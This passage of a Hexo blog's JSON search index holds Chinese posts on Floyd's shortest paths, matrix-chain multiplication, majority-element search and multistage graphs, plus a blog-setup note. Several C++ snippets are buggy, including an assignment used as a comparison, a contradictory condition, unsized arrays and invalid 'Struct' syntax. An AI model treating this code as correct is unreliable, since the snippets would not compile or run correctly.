我有一瓢酒，可以慰风尘","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"算法篇","slug":"博客篇/算法篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/"}],"tags":[{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"https://huacheng1122.cn/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"}],"author":"花城"},{"title":"动态规划_每对结点间的最短路径_Floyd","slug":"动态规划-每对结点间的最短路径-Floyd","date":"2021-09-29T08:50:34.000Z","updated":"2021-09-29T09:15:33.774Z","comments":true,"path":"posts/9584e53f.html","link":"","permalink":"https://huacheng1122.cn/posts/9584e53f.html","excerpt":"","text":"0x001 问题描述 设$G=(V,E)$是一个有$n$个结点的带权有向图，$w(i,j)$是权函数 w(i,j)=\\begin{cases} 边上的权值 &\\text{if } \\in E \\\\ 0 &\\text{if } i=j\\\\ \\infty &\\text{if } \\notin E \\end{cases}每对结点间的最短路径问题是指图中任意一对结点$i$和$j$之间的最短路径。 0x002 分析 Dijkstra算法要求图中的边的权为非负值，而本问题中允许边的权为负值，但不允许路径长度为负值的回路，因为若结点$i$到结点$j$的路径上存在负值回路，则意味着结点$i$到结点$j$没有最短路径。 0x003 最优子结构特性 设$G=(V,E)$是带权有向图，L(i,j)是从结点$i$到结点$j$的最短路径长度，$k$是这条路径上的一个结点，$L(i,k)$和$L(k,j)$分别是从$i$到$k$和从$k$到$j$的最短路径长度，则必有$L(i,j)=L(i,k)+L(k,j)$,若不然，则$L(i,j)$代表的路径就不是最短路径。 0x004 最优解值的递推关系 d_{-1}[i][j]=\\begin{cases} w(i,j) &\\text{if } \\in E \\\\ \\infty &\\text{if } \\notin E \\end{cases}d_k[i][j]=\\min\\{d_{k-1}[i][j],d_{k-1}[i][k]+d_{k-1}[k][j]\\},1\\leq k \\leq n-1其中$dk[i][j]$表示从结点$i$到结点$j$的路径上，只允许包含编号不大于$k$的结点时，所以可能的路径中的最短路径的长度，$d{-1}[i][j]$表示从$i$到$j$不包含结点（直达）的长度，$L(i,j)=d_{n-1}[i][j]$ 0x005 重叠子问题 为了计算$dk[i][j]$时，必须计算$d{k-1}[i][j],d{k-1}[i][k],d{k-1}[k][j]$ 邻接矩阵$a$存储有向图 二维数组$d$用于保存各条最短路径的长度，其中$d[i][j]$存放从结点$i$到结点$j$的最短路径的长度 二维数组$path$记录相应的最短路径，$path[i][j]$给出从结点$i$到结点$j$的最短路径中的前一个结点，可以反向追溯最短路径 初始时$d[i][j]=a[i][j]$ 令$k=0,1,…,n-1$,每次考察一个结点$k$ 在算法的第$k$步上应作出决策：从$i$到$j$的最短路径上是否包含结点$k$ 0x006 程序 #include&lt;iostream&gt; using namespace std; vector&lt;vector&lt;int&gt; &gt; a;//邻接矩阵 vector&lt;vector&lt;int&gt; &gt; d;//保存每对结点之间最短路径 vector&lt;vector&lt;int&gt; &gt; path;//标记函数 int n;//结点数 //创建邻接矩阵 void CreateA(){ cin &gt;&gt; n; for(int i = 0;i &lt; n;i ++){ vector&lt;int&gt; v; int v1; for(int j = 0;j &lt; n;j ++){ cin &gt;&gt; v1; v.push_back(v1); } a.push_back(v); } } void allPath(){ for(int i = 0;i &lt; n;i ++){//初始化d for(int j = 0;j &lt; n;j ++){ d[i][j] = a[i][j]; } } //迭代：对于点k，若i直接到j的距离大于1-&gt;k-&gt;j的距离和时，改写d[i][j] for(int k = 0;k &lt; n;k ++){ for(int i = 0;i &lt; n;i ++){ for(int j = 0;j &lt; n;j ++){ if(d[i][k]+d[k][j]&lt;d[i][j]) d[i][j] = d[i][k] + d[k][j]; } } } } int main(){ CreateA(); allPath(); return 0; } 0x007 结束语 其实你并没有什么忘不掉的人，只是始终对自己那场没有结果的付出和被浪费的爱耿耿于怀。","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"算法篇","slug":"博客篇/算法篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/"}],"tags":[{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"https://huacheng1122.cn/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"},{"name":"c++","slug":"c","permalink":"https://huacheng1122.cn/tags/c/"}],"author":"花城"},{"title":"动态规划_备忘录法_矩阵链乘","slug":"动态规划-备忘录法-矩阵链乘","date":"2021-09-29T03:50:39.000Z","updated":"2021-09-29T04:45:33.256Z","comments":true,"path":"posts/46b98235.html","link":"","permalink":"https://huacheng1122.cn/posts/46b98235.html","excerpt":"","text":"0x001 问题描述 给定$n$个矩阵${A1,A_2,A_3,…,A_n}$，其中$A_i$为$P{i-1} Pi$矩阵，$i = 1,…,n$，并且$A_i$与$A{i-1}$是可乘的。由于矩阵乘法满足结合律，所以计算矩阵的链乘可有许多不同的计算次序，两个矩阵$A_{ij}$与$A_{j k}$相乘的工作量为i j * k次数乘。 给定向量$P= (P_0,P_1,…,P_n)$为$n$个矩阵的行数和列数，确定一种乘法次序，使得基本运算“数乘”的总次数最少。 0x002 完全加括号 完全加括号的矩阵链乘积可递归地定义为： 单个矩阵是完全加括号的 矩阵链乘积$A$是完全加括号的，则$A$可表示为两个完全加括号的矩阵链乘积$B$和$C$的乘积，并加括号，即$A=(BC)$ 0x003 最优子结构 矩阵链乘$AiA{i+1}…Aj$简记为$A{i…j},i&lt; j$，于是矩阵链乘$A1A_2…A_n$可记为$A{1…n}$，完全加括号形式为 A_{1...n}=A_{1...k}A_{k+1...n},1< k < n 矩阵连乘$A{1…n}$的最优计算次序的计算量等于$A{1…k}$和$A{k+1…n}$两者的最优计算次序的计算量之和，再加上$A{1…k}$和$A_{k+1…n}$相乘的计算量。矩阵链乘问题的最优解具有最优子结构特性。 0x004 最优解的递推关系 由$i$和$j$确定子问题的边界，输入$P=(P_0,P_1,…P_n)$ A_{i...j}=A_{i...k}A_{k+1...j},k=i,i+1,...,j-1 确定优化函数和递推方程：二维数组$m$用来保存矩阵链乘时所需的最小计算量 m[i][j]=\\begin{cases} \\min\\limits_{i\\leq k < j} \\{m[i][k]+m[k+1][j]+P_{i-1}P_kP_j\\} &\\text{if } i","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"算法篇","slug":"博客篇/算法篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/"}],"tags":[{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"https://huacheng1122.cn/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"},{"name":"c++","slug":"c","permalink":"https://huacheng1122.cn/tags/c/"}],"author":"花城"},{"title":"分治算法_主元素问题","slug":"分治算法-主元素问题","date":"2021-09-28T16:16:52.000Z","updated":"2021-09-29T04:10:16.084Z","comments":true,"path":"posts/d7a49e9b.html","link":"","permalink":"https://huacheng1122.cn/posts/d7a49e9b.html","excerpt":"","text":"0x001 问题描述 设$T[0:n-1]$是$n$个元素的数组，对任一元素$x$，设$s(x)={i|T[i]=x}$,当$|s(x)|&gt;n/2$时，称$x$为$T$的主元素，设计一个线性时间算法，确定$T[0:n-1]$是否有一个主元素。 0x002 分析 若$T$存在主元素则将$T$分为两部分，$T$的主元素也必为两部分中至少一部分的主元素，将元素划分两部分，递归检查两部分有无主元素。 若$T$只含一元素，则此元素就是主元素，返回此数$T_1,T_2$主元素$m_1,m_2$ 若$m_1=m_2$且$m_1\\ne null$,返回此数 若$m_1\\ne null$,if $m_1$为主元素，返回$m_1$ 若$m_2\\ne null$,if $m_2$为主元素，返回$m_2$ 否则返回$null$ 0x003 算法 是否为主元素bool isMaster(int m){ int k = 0; for(int i = 0;i &lt; n;i ++){ if(T[i] = m) k++; } if(k &gt; n/2) return true; else return false; } 寻找主元素int findMaster(vector&lt;int&gt; T,int n){ if(n == 1){ return T[1]; }else{ vector&lt;int&gt; T1,T2; for(int i = 0;i &lt;= n/2;i ++){ T1.push_back(T[i]); } for(int i = n/2+1;i &lt; n;i ++){ T2.push_back(T[i]); } m1 = findMaster(T1,n/2+1); m2 = findMaster(T2,n/2-1); if(m1 == m2 &amp;&amp; m1 != m2) return m1; if(m1 != Null){ if(isMaster(m1)) return m1; } if(m2 != Null){ if(isMaster(m2)) return m2; } return Null; } } 主函数#include&lt;iostream&gt; #include&lt;vector&gt; using namespace std; int main(){ int n,master; cin &gt;&gt; n; vector&lt;int&gt; T; for(int i = 0;i &lt; n;i ++){ int t; cin &gt;&gt; t; T.push_back(t); } master = findMaster(T,n); cout &lt;&lt; \"主元素：\" &lt;&lt; master; return 0; } 0x004 结束语 山林不向四季起誓，荣枯随缘","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"算法篇","slug":"博客篇/算法篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/"}],"tags":[{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"https://huacheng1122.cn/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"},{"name":"c++","slug":"c","permalink":"https://huacheng1122.cn/tags/c/"}],"author":"花城"},{"title":"动态规划_多段图问题","slug":"动态规划-多段图问题","date":"2021-09-27T15:12:48.000Z","updated":"2021-09-27T16:49:22.875Z","comments":true,"path":"posts/6850d53f.html","link":"","permalink":"https://huacheng1122.cn/posts/6850d53f.html","excerpt":"","text":"0x001 问题描述 将$n$个资源分配给$r$个项目，已知如果把$j$个资源分配给第$i$个项目，可以收益$N(i,j),0 \\leq j \\leq n,1 \\leq i \\leq r$,求总收益最大的资源分配方案。 0x002 问题分析 1.用$r+1$段图描述 2.每个状态节点$V(i,j)$代表已将$j$个资源分配给前$i-1$个项目 3.边都具有$(V(i,j),V(i+1,k))(0 \\leq j \\leq k \\leq n,1 \\leq i \\leq r)$ 4.边上的权值$N(i,k-j)$是本次分配的收益 5.$r+1$个阶段 第一个阶段：开始阶段尚未分配任何资源，只包含一个初始状态$S=V(1，0)$ 第$r+1$阶段：结束阶段，表示整个分配完成，只有一个结束状态$t=V(r+1,n)$ 其他$r-1$个中间阶段：每个阶段包含$n+1$个状态 0x003 多段图概述 设图 $G =(V,E)$是一个带权有向图，如果把顶点集合 $V$ 划分成$k$个互不相交的子集 $V_i(2\\leq k\\leq n,1\\leq i\\leq k)$，使得$E$ 中的任何一条边 $$，必有 $u∈Vi, v∈Vi + m(1\\leq i &lt; k, 1&lt;i+m\\leq k)$,则称图 $G$ 为多段图，称 $s∈V_1$ 为源点，$t∈V_k$ 为终点。多段图的最短路径问题为从源点到终点的最小代价路径。 0x004 递推关系 （从后）向前递推关系式 \\begin{cases} cost(i,j)= \\min\\limits_{j∈V_i,p∈V_{i+1},∈E} \\{c(j,p)+cost(i+1,p)\\} &\\text{if } 0\\leq i \\leq k-2 \\\\ cost(k,t)=0 \\end{cases}$cost(i,j)$是从第$i$阶段中某个节点状态$j$到汇点状态$t$的最短路径长度，$cost(1,0)$为多段图问题的最优解值，即为所求。 设$d(i,j)$表示从第$i$阶段节点$j$到$t$的最短路径上节点$j$的下一个节点编号，利用$d$值进行反向追溯可确定最短路径上的节点。 0x005 程序设计 数据结构：采用邻接表存储该有向无环图的节点及边的信息 源点$s$编号为0，汇点的编号为$n-1$（共有$n$节点，$m$条边） $cost[i]$保存节点$i$到汇点$t$的最短路径长度 $cost[n-1]$为0，汇点到汇点的最短路径长度为0 $cost[0]$为最优解值，为计算$cost[j]$,必须计算子问题：后继节点$p$到汇点的最短路径$cost[p]$ $cost[j]=\\min{c(j,p)+cost[p]}$,$c(j,p)$为边$$的长度（权） 代码 节点结构 Struct ENode{ int adjVex; int w; ENode *nextArc } 其他变量 vector&lt;Struct ENode&gt; a;//邻接表，数组中存节点 vector&lt;int&gt; cost;//最短长度 int n;//总节点数 int m;//总边数 构建邻接表 void CreatGraph(){ int u,v; int w; Struct ENode t; for(int i = 0;i &lt; n;i ++){ a.push_back(t); } for(int i = 0;i &lt; m;i ++){ cin &gt;&gt; u &gt;&gt; v &gt;&gt; w; t-&gt;adjVex = v; t-&gt;nextArc = a[u]; t-&gt;w = w; a[u] = t; } } 向前递推算法 void FMultiGraph(){ cost[n-1] = 0; int min; Struct ENode r; for(int i = n-2;i &gt;= 0;i --){ min = max; for(Struct ENode r = a[i];r;r = r-&gt;nextArc){ if(r-&gt;w + cost[r-&gt;adjVex] &lt; min){ min = r-&gt;w + cost[r-&gt;adjVex]; } } cost[i] = min; } } 0x006 结束语 旅人等在这里，虔诚仰望着云开","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"算法篇","slug":"博客篇/算法篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/"}],"tags":[{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"https://huacheng1122.cn/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"},{"name":"c++","slug":"c","permalink":"https://huacheng1122.cn/tags/c/"}],"author":"花城"},{"title":"记一次博客搭建感受","slug":"huacheng-blog","date":"2021-09-27T13:17:55.000Z","updated":"2021-09-29T04:09:17.822Z","comments":true,"path":"posts/a63d1ca2.html","link":"","permalink":"https://huacheng1122.cn/posts/a63d1ca2.html","excerpt":"","text":"0x001 博客效果图 博客地址：https://huacheng1122.cn 今天博客基本搭建完成，连着折腾了五六天，弱弱的身体表示很虚。后续还会继续完善和更新博客。 最开始博客我用的是博客园和CSDN的，直到一个礼拜前在网上看到了大佬Luckysec的一篇博客,才注意到他的博客，真是让我眼前一亮，两眼放光，目瞪口呆~~ 于是我搭建了他的开源博客。现在主要用自己搭建的博客和CSDN，不是说博客园不好，而是我更喜欢搭建的博客的这种自由之风。 博客基本和博主的差不多，有些封面没有好看的图片，暂时用博主的，之后还会换。 大神的博客：http://www.luckyzmj.cn/ 基于hexo框架和github部署 在整个搭建过程中，原以为很简单，不料~┭┮﹏┭┮，部署到github出现错误（由于配置不当和nodejs版本低）；购买域名后再次配置和部署出现错误；还有一些网站收录；等一系列问题，由于没有记录，无法详细说明，这些问题着实让人烦恼，但在查找问题的时候，不自觉的也学到了很多知识，自己还是很满足的，之后会继续学习，努力向大神看齐！ 再次欢迎大家关注博客，互相学习交流嘛~ https://huacheng1122.cn 0x002 结束语 看不清未来时，就比别人坚持久一点。","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"}],"tags":[{"name":"博客","slug":"博客","permalink":"https://huacheng1122.cn/tags/%E5%8D%9A%E5%AE%A2/"}],"author":"花城"},{"title":"Hello World","slug":"hello-world","date":"2021-09-24T17:41:33.373Z","updated":"2021-09-25T01:07:30.716Z","comments":true,"path":"posts/4a17b156.html","link":"","permalink":"https://huacheng1122.cn/posts/4a17b156.html","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new \"My New Post\" More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"CTF笔记篇","slug":"博客篇/CTF笔记篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/CTF%E7%AC%94%E8%AE%B0%E7%AF%87/"},{"name":"算法篇","slug":"博客篇/算法篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/"}],"tags":[{"name":"博客","slug":"博客","permalink":"https://huacheng1122.cn/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"CTF","slug":"CTF","permalink":"https://huacheng1122.cn/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://huacheng1122.cn/tags/web/"},{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"https://huacheng1122.cn/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"},{"name":"c++","slug":"c","permalink":"https://huacheng1122.cn/tags/c/"}]}